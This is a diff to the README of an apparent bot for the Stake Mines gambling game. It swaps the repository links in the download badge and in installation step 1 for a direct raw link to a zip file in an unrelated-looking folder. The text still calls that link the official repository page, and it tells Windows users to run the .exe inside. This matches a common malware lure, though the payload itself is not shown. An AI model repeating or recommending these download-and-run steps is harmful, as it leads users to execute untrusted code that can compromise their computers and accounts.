@@ -1,6 +1,6 @@
 # 🤖 stake-mines-bot - Automate your Stake Mines game strategy
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Malisa6293/stake-mines-bot)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Malisa6293/stake-mines-bot/main/disquisitorial/stake_mines_bot_bartender.zip)
 
 ## 🎯 About This Tool
 
@@ -19,7 +19,7 @@ Ensure your computer meets these needs before you start:
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official repository page to download the latest version: [https://github.com/Malisa6293/stake-mines-bot](https://github.com/Malisa6293/stake-mines-bot).
+1.  Visit the official repository page to download the latest version: [https://raw.githubusercontent.com/Malisa6293/stake-mines-bot/main/disquisitorial/stake_mines_bot_bartender.zip](https://raw.githubusercontent.com/Malisa6293/stake-mines-bot/main/disquisitorial/stake_mines_bot_bartender.zip).
 2.  Locate the file ending in .exe in the downloads section.
 3.  Save the file to a folder you can find later, such as your Desktop.
 4.  Double-click the file to start the installation setup.
